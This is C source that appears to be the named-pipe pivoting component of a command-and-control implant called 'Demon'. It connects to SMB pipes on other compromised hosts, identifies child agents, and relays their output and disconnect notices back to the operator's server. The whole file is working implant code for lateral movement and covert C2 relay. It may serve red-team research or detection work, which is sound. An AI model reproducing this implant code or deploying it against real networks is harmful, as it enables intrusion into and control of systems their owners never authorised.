#include <Demon.h>

#include <Common/Macros.h>

#include <Core/Parser.h>
#include <Core/MiniStd.h>
#include <Core/Command.h>
#include <Core/Package.h>

/* TODO: Change the way new pivots gets added.
 *
 * Instead of appending it to the newest token like:
 * PivotNew->Next = Pivot
 *
 * Add it to the first token (parent):
 *
 * Pivot->Next         = Instance.SmbPivots;
 * Instance.SmbPivots = Pivot;
 *
 * Might reduce some code which i care more than
 * pivot order.
 */

BOOL PivotAdd( LPWSTR NamedPipe, PVOID* Output, PSIZE_T BytesSize )
{
    PPIVOT_DATA Data    = NULL;
    HANDLE      Handle  = NULL;

    Handle = Instance.Win32.CreateFileW( NamedPipe, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL );

    if ( ! Handle )
    {
        PRINTF( "CreateFileW: Failed[%d]\n", NtGetLastError() );
        return FALSE;
    }

    if ( NtGetLastError() == ERROR_PIPE_BUSY )
    {
        if ( ! Instance.Win32.WaitNamedPipeW( NamedPipe, 5000 ) )
        {
            return FALSE;
        }
    }

    do
    {
        // TODO: first get the size then parse
        if ( Instance.Win32.PeekNamedPipe( Handle, NULL, 0, NULL, BytesSize, NULL ) )
        {
            if ( *BytesSize > 0 )
            {
                PRINTF( "BytesSize => %d\n", *BytesSize );

                *Output = Instance.Win32.LocalAlloc( LPTR, *BytesSize );
                MemSet( *Output, 0, *BytesSize );

                if ( Instance.Win32.ReadFile( Handle, *Output, *BytesSize, BytesSize, NULL ) )
                {
                    PRINTF( "BytesSize Read => %d\n", *BytesSize );
                    break;
                }
                else
                {
                    PRINTF( "ReadFile: Failed[%d]\n", NtGetLastError() );
                    return FALSE;
                }
            }
        }
        else
        {
            PRINTF( "PeekNamedPipe: Failed[%d]\n", NtGetLastError() );
            return FALSE;
        }
    } while ( TRUE );

    // Adding data to the list
    {
        PRINTF( "Pivot :: Output[%p] Size[%d]\n", *Output, *BytesSize )

        Data              = Instance.Win32.LocalAlloc( LPTR, sizeof( PIVOT_DATA ) );
        Data->PipeName    = NamedPipe;
        Data->Handle      = Handle;
        Data->Next        = NULL;
        Data->DemonID     = PivotParseDemonID( *Output, *BytesSize );
        Data->PipeName    = Instance.Win32.LocalAlloc( LPTR, StringLengthW( NamedPipe ) * 2 );
        MemCopy( Data->PipeName, NamedPipe, StringLengthW( NamedPipe ) * 2 );

        if ( ! Instance.SmbPivots )
        {
            Instance.SmbPivots = Data;
        }
        else
        {
            PPIVOT_DATA PivotList = Instance.SmbPivots;

            do
            {
                if ( PivotList )
                {
                    if ( PivotList->Next )
                        PivotList = PivotList->Next;

                    else
                    {
                        PivotList->Next = Data;
                        break;
                    }
                }
                else break;
            } while ( TRUE );
        }
    }

    return TRUE;
}

PPIVOT_DATA PivotGet( DWORD AgentID )
{
    PPIVOT_DATA TempList = Instance.SmbPivots;
    DWORD       Counter  = 0;

    do {
        if ( TempList )
        {
            if ( TempList->DemonID == AgentID )
                return TempList;

            TempList = TempList->Next;
        } else
            break;
    } while ( TRUE );

    return Counter;
}

BOOL PivotRemove( DWORD AgentId )
{
    PRINTF( "Remove pivot %x", AgentId )

    PPIVOT_DATA TempList  = Instance.SmbPivots;
    PPIVOT_DATA PivotData = PivotGet( AgentId );
    BOOL        Success   = FALSE;

    if ( ( ! TempList ) || ( ! PivotData ) )
        return FALSE;

    if ( Instance.SmbPivots->DemonID == AgentId )
    {
        PPIVOT_DATA TempNext = Instance.SmbPivots->Next;

        if ( Instance.SmbPivots->PipeName )
        {
            MemSet( Instance.SmbPivots->PipeName, 0, StringLengthA( Instance.SmbPivots->PipeName ) );
            Instance.Win32.LocalFree( Instance.SmbPivots->PipeName );
        }

        if ( Instance.SmbPivots->Handle )
        {
            Instance.Win32.DisconnectNamedPipe( Instance.SmbPivots->Handle );
            Instance.Win32.NtClose( Instance.SmbPivots->Handle );
        }

        Instance.SmbPivots->PipeName = NULL;
        Instance.SmbPivots->Handle   = NULL;
        Instance.SmbPivots->DemonID  = 0;

        MemSet( Instance.SmbPivots, 0, sizeof( PIVOT_DATA ) );
        Instance.Win32.LocalFree( Instance.SmbPivots );

        Instance.SmbPivots = TempNext;

        return TRUE;
    }

    do {
        if ( TempList )
        {
            if ( TempList->Next == PivotData )
            {
                TempList->Next = PivotData->Next;

                if ( PivotData->PipeName )
                {
                    MemSet( PivotData->PipeName, 0, StringLengthA( PivotData->PipeName ) );
                    Instance.Win32.LocalFree( PivotData->PipeName );
                }

                if ( PivotData->Handle )
                {
                    Instance.Win32.DisconnectNamedPipe( PivotData->Handle );
                    Instance.Win32.NtClose( PivotData->Handle );
                }

                PivotData->PipeName = NULL;
                PivotData->Handle   = NULL;
                PivotData->DemonID  = 0;

                MemSet( PivotData, 0, sizeof( PIVOT_DATA ) );
                Instance.Win32.LocalFree( PivotData );
                PivotData = NULL;

                return TRUE;
            }
            else
                TempList = TempList->Next;
        } else
            break;
    } while ( TRUE );

    return Success;
}

DWORD PivotCount()
{
    PPIVOT_DATA TempList = Instance.SmbPivots;
    DWORD       Counter  = 0;

    do {
        if ( TempList )
        {
            Counter++;
            TempList = TempList->Next;
        } else
            break;
    } while ( TRUE );

    return Counter;
}

VOID PivotCollectOutput()
{
    PPACKAGE    Package   = NULL;
    PPIVOT_DATA TempList  = Instance.SmbPivots;
    DWORD       BytesSize = 0;
    DWORD       Length    = 0;
    PVOID       Output    = NULL;

    // TODO: send everything back.
    do
    {
        if ( ! TempList )
            break;

        if ( TempList->Handle )
        {
            do {

                if ( Instance.Win32.PeekNamedPipe( TempList->Handle, NULL, 0, NULL, &BytesSize, NULL ) )
                {
                    if ( BytesSize >= sizeof( UINT32 ) )
                    {
                        if ( Instance.Win32.PeekNamedPipe( TempList->Handle, &Length, sizeof( UINT32 ), NULL, &BytesSize, NULL ) )
                        {
                            Length = __builtin_bswap32( Length ) + sizeof( UINT32 );
                            Output = Instance.Win32.LocalAlloc( LPTR, Length );

                            if ( Instance.Win32.ReadFile( TempList->Handle, Output, Length, &BytesSize, NULL ) )
                            {
                                Package = PackageCreate( DEMON_COMMAND_PIVOT );
                                PackageAddInt32( Package, DEMON_PIVOT_SMB_COMMAND );
                                PackageAddBytes( Package, Output, BytesSize );

                                PackageTransmit( Package, NULL, NULL );
                            }
                            else PRINTF( "ReadFile: Failed[%d]\n", NtGetLastError() );

                            MemSet( Output, 0, Length );
                            Instance.Win32.LocalFree( Output );
                            Output = NULL;
                        }
                    } else break;
                }
                else
                {
                    PRINTF( "PeekNamedPipe: Failed[%d]\n", NtGetLastError() );

                    if ( NtGetLastError() == ERROR_BROKEN_PIPE )
                    {
                        PUTS( "ERROR_BROKEN_PIPE. Remove pivot" )

                        /* Sends already read data. */
                        PackageTransmit( Package, NULL, NULL );

                        PUTS( "1" )
                        DWORD DemonID = TempList->DemonID;
                        BOOL  Removed = PivotRemove( TempList->DemonID );

                        PRINTF( "Pivot removed: %s\n", Removed ? "TRUE" : "FALSE" )

                        /* Report if we managed to remove the selected pivot */
                        Package = PackageCreate( DEMON_COMMAND_PIVOT );
                        PackageAddInt32( Package, DEMON_PIVOT_SMB_DISCONNECT );
                        PackageAddInt32( Package, Removed );
                        PackageAddInt32( Package, DemonID );

                        PackageTransmit( Package, NULL, NULL );

                        return;
                    }

                    CALLBACK_GETLASTERROR
                    PackageDestroy( Package );

                    break;
                }

            } while ( TRUE );
        }

        // select the next pivot
        TempList = TempList->Next;

    } while ( TRUE );
}


UINT32 PivotParseDemonID( PVOID Response, SIZE_T Size )
{
    PARSER Parser  = { 0 };
    UINT32 Value   = 0;

    ParserNew( &Parser, Response, Size );

    ParserGetInt32( &Parser );
    ParserGetInt32( &Parser );

    Value = __builtin_bswap32( ParserGetInt32( &Parser ) );

    PRINTF( "Parsed DemonID => %x\n", Value );

    ParserDestroy( &Parser );

    return Value;
}